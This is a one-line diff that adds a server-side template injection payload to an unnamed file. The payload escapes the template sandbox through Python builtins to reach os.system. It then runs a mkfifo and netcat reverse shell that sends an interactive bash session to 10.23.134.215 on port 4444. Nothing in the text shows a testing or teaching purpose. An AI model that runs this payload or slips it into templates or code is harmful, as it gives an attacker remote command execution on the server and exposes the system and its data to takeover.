@@ -1,0 +1,1 @@
+{{ self.__init__.__globals__.__builtins__.__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.23.134.215 4444 >/tmp/f')}}
